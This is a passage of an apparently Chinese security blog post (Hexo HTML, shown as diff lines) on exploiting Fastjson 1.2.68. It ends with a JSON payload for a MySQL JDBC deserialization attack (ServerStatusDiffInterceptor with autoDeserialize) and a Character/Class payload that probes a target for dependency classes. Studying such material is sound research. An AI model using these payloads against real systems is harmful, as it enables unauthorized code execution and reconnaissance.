class="line">                            <span class="attr">&quot;host&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span></span><br><span class="line">                     <span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                     <span class="attr">&quot;slaves&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                     <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;host&quot;</span><span class="punctuation">:</span><span class="string">&quot;127.0.0.1:&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;user&quot;</span><span class="punctuation">:</span><span class="string">&quot;deser_CUSTOM&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;dbname&quot;</span><span class="punctuation">:</span><span class="string">&quot;dbname&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;pass&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;queryInterceptors&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;autoDeserialize&quot;</span><span class="punctuation">:</span><span class="string">&quot;true&quot;</span></span><br><span class="line">                     <span class="punctuation">&#125;</span></span><br><span class="line">              <span class="punctuation">&#125;</span></span><br><span class="line">       <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h3 id="探测依赖类-Trick"><a href="#探测依赖类-Trick" class="headerlink" title="探测依赖类 Trick"></a>探测依赖类 Trick</h3><p>利用<code>java.lang.Character</code>构造函数，会将<code>value</code>的值强转为<code>char</code>类型然后赋值给<code>this.value</code>​</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260115163711-p814kky.png" alt="image"></p>
+<p>若传入的值为<code>class</code>，则会抛出异常 –&gt; <code>can not cast to char, value : class java.lang.String</code>​</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Character&quot;</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.String&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>若<code>&quot;val&quot;</code>中的类不存在，则<code>value</code>就为<code>null</code>，就不会抛出异常</p>
+<p>‍</p>
+<p>‍</p>
+<p>‍</p>
+<hr>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/14969606.html">https://www.cnblogs.com/zpchcbd/p/14969606.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg">https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg</a></p>
+<p><a target="_blank" rel="noopener" href="https://whoopsunix.com/docs/components/fastjson/recurring/">https://whoopsunix.com/docs/components/fastjson/recurring/</a></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2026/01/11/XXL-JOB/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2026-01-15 17:13:05
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Fastjson-1-2-68-%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6-MySQL-JDBC-%E4%BE%9D%E8%B5%96%E6%8E%A2%E6%B5%8BTrick"><span class="toc-text">Fastjson 1.2.68 读写文件 &amp; MySQL JDBC &amp; 依赖探测Trick</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass-autoType"><span class="toc-text">bypass autoType</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-text">文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SafeFileOutputStream"><span class="toc-text">SafeFileOutputStream</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99"><span class="toc-text">任意文件写</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MarshalOutputStream"><span class="toc-text">MarshalOutputStream</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XmlStreamReader-%E4%BF%AE%E6%94%B9decoder%E4%B8%BAnull%E9%80%A0%E6%88%90%E7%9A%84%E7%A9%BA%E6%8C%87%E9%92%88%E9%97%AE%E9%A2%98"><span class="toc-text">XmlStreamReader &amp;&amp; 修改decoder为null造成的空指针问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#kryo-Output"><span class="toc-text">kryo - Output</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL-JDBC-%E5%88%A9%E7%94%A8"><span class="toc-text">MySQL JDBC 利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JDBC4Connection"><span class="toc-text">JDBC4Connection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#DNSLOG-%E6%8E%A2%E6%B5%8B-RCE"><span class="toc-text">DNSLOG 探测 &amp; RCE</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LoadBalancedMySQLConnection"><span class="toc-text">LoadBalancedMySQLConnection</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ReplicationMySQLConnection"><span class="toc-text">ReplicationMySQLConnection</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E4%BE%9D%E8%B5%96%E7%B1%BB-Trick"><span class="toc-text">探测依赖类 Trick</span></a></li></ol></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/KaGty1">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2026 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+    <div class="footer-views">
+      
+      
+          本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+        
+      
+      
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Fastjson%201.2.68%20%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6%20%26%20MySQL%20JDBC%20%26%20%E4%BE%9D%E8%B5%96%E6%8E%A2%E6%B5%8BTrick + '&url=' + http%3A%2F%2Fkagty1.github.io%2F2026%2F01%2F15%2FFastjson%25201.2.68%2520%25E8%25AF%25BB%25E5%2586%2599%25E6%2596%2587%25E4%25BB%25B6%2520%26%2520MySQL%2520JDBC%2520%26%2520%25E4%25BE%259D%25E8%25B5%2596%25E6%258E%25A2%25E6%25B5%258BTrick_cos%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://kagty1.github.io/2026/01/15/Fastjson%201.2.68%20%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6%20&%20MySQL%20JDBC%20&%20%E4%BE%9D%E8%B5%96%E6%8E%A2%E6%B5%8BTrick_cos/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
